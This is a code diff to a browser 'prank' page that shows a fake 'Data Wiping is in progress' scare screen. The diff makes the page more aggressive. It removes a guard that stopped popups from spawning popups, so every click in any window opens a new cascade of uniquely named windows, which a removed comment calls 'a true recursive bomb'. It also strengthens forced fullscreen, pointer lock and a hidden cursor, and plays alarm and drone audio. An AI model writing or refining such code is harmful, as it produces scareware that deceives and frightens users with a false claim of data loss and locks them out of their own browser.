@@ -193,9 +193,9 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             const byteRate = sampleRate * numChannels * (bitsPerSample / 8);
             const blockAlign = numChannels * (bitsPerSample / 8);
             const dataSize = pcm16.length * 2;
-            const fileSize = 36 + dataSize;
-
-            const buffer = new ArrayBuffer(fileSize);
+            const totalBufferSize = 44 + dataSize; // FIX: Correct total size for ArrayBuffer
+            
+            const buffer = new ArrayBuffer(totalBufferSize); // FIX APPLIED
             const view = new DataView(buffer);
             let offset = 0;
 
@@ -204,20 +204,27 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                     view.setUint8(offset++, s.charCodeAt(i));
                 }
             }
-            writeString('RIFF');
-            view.setUint32(offset, fileSize - 8, true); offset += 4;
-            writeString('WAVE');
-            writeString('fmt ');
-            view.setUint32(offset, 16, true); offset += 4;
-            view.setUint16(offset, 1, true); offset += 2;
+            
+            // RIFF Chunk (0 - 11)
+            writeString('RIFF'); 
+            view.setUint32(offset, totalBufferSize - 8, true); offset += 4; // ChunkSize (Total size - 8)
+            writeString('WAVE'); 
+
+            // FMT Chunk (12 - 35)
+            writeString('fmt '); 
+            view.setUint32(offset, 16, true); offset += 4; // Subchunk1Size
+            view.setUint16(offset, 1, true); offset += 2;  // Audio format
             view.setUint16(offset, numChannels, true); offset += 2;
             view.setUint32(offset, sampleRate, true); offset += 4;
             view.setUint32(offset, byteRate, true); offset += 4;
             view.setUint16(offset, blockAlign, true); offset += 2;
             view.setUint16(offset, bitsPerSample, true); offset += 2;
-            writeString('data');
-            view.setUint32(offset, dataSize, true); offset += 4;
             
+            // DATA Chunk (36 - 43)
+            writeString('data'); 
+            view.setUint32(offset, dataSize, true); offset += 4; // Subchunk2Size
+            
+            // Write PCM data (44 onwards)
             for (let i = 0; i < pcm16.length; i++) {
                 view.setInt16(offset, pcm16[i], true); offset += 2;
             }
@@ -230,11 +237,6 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         const hideAndLock = () => {
             if (!prankActivated) return;
             document.documentElement.style.cursor = 'none';
-            // Re-assert pointer lock (often fails silently, but constant attempts help)
-            document.body.requestPointerLock = document.body.requestPointerLock || document.body.mozRequestPointerLock || document.body.webkitRequestPointerLock;
-            if (document.body.requestPointerLock && !document.pointerLockElement) {
-                document.body.requestPointerLock();
-            }
             if (!document.fullscreenElement) {
                 forceFullscreen();
             }
@@ -412,7 +414,8 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                     clearInterval(floodInterval);
                     return;
                 }
-                window.open(autoStartUrl, '_blank', getRandomWindowFeatures(600, 400));
+                // Use a different window name for each one to ensure they are new windows
+                window.open(autoStartUrl, 'floodWindow' + count, getRandomWindowFeatures(600, 400));
                 count++;
             }, 50); 
         }
@@ -421,19 +424,16 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         function startSynchronousBlast() {
             const NUM_WINDOWS = 5; 
             for (let i = 0; i < NUM_WINDOWS; i++) {
-                window.open(autoStartUrl, '_blank', getRandomWindowFeatures(800, 600));
+                // Use a different window name for each one to ensure they are new windows
+                window.open(autoStartUrl, 'blastWindow' + i, getRandomWindowFeatures(800, 600));
             }
         }
 
-        // --- Window Flood Repeat Function ---
+        // --- Window Flood Repeat Function (Recursive Cascade Enabled) ---
         function repeatWindowFlood() {
-            // This function is now the dedicated, permanent click listener
-            // Check if the current window is the main starter window (hash !== '#start')
-            // This prevents a popup from spawning more popups (a true recursive bomb)
-            if (window.location.hash !== '#start') {
-                startSynchronousBlast(); 
-                startSecondaryFlood();
-            }
+            // This is the new logic: EVERY click on ANY window triggers a new flood.
+            startSynchronousBlast(); 
+            startSecondaryFlood();
         }
 
 
@@ -446,9 +446,10 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         }
         
         function forcePointerLock() {
-            document.body.requestPointerLock = document.body.requestPointerLock || document.body.mozRequestPointerLock || document.body.webkitRequestPointerLock;
-            if (document.body.requestPointerLock && !document.pointerLockElement) {
-                document.body.requestPointerLock();
+            // FIX: Target htmlEl for robust Pointer Lock request
+            htmlEl.requestPointerLock = htmlEl.requestPointerLock || htmlEl.mozRequestPointerLock || htmlEl.webkitRequestPointerLock;
+            if (htmlEl.requestPointerLock && !document.pointerLockElement) {
+                htmlEl.requestPointerLock();
             }
         }
 
@@ -476,7 +477,7 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                 if(isEscapeAttempt && Tone.Transport.state === 'started') {
                     Tone.Transport.bpm.value = ALARM_BPM_NORMAL; 
                 }
-            }, 10); 
+            }, 30); 
         }
 
         // --- Constant Ambient Glitch Loop (Randomized) ---
@@ -498,19 +499,20 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             
             // CRITICAL LOCKDOWN ACTIONS (Run on ALL instances)
             forceFullscreen();
-            forcePointerLock(); 
+            forcePointerLock(); // Initial synchronous call remains here
             requestAnimationFrame(hideAndLock); 
             startAmbientGlitchLoop();
             startProgressLoop();
 
             // CRITICAL AUDIO SETUP (Only done once per instance)
-            // Tone.start must be inside the user gesture handler
             Tone.start().then(() => {
                 playScaryDrone(); 
                 if (window.location.hash !== '#start') {
-                    speakAndPlayWarning(); // Main window
+                    // Only start TTS/Alarm sequence once, on the main window.
+                    speakAndPlayWarning(); 
                 } else {
-                    startBackgroundAlarm(); // Popup
+                    // Popups immediately start the background alarm to avoid needing a second click
+                    startBackgroundAlarm(); 
                 }
             });
 
@@ -518,9 +520,9 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             // Attach the permanent listener for REPEATING the flood to every page instance.
             document.body.addEventListener('click', repeatWindowFlood);
             
-            // WINDOW FLOOD (Only trigger the FIRST flood on the original window)
+            // WINDOW FLOOD (Initiate the first cascade immediately on the original window)
             if (window.location.hash !== '#start') {
-                repeatWindowFlood(); // Initial blast
+                repeatWindowFlood(); 
             }
             
             // Remove the one-time click listener that triggered the initialization
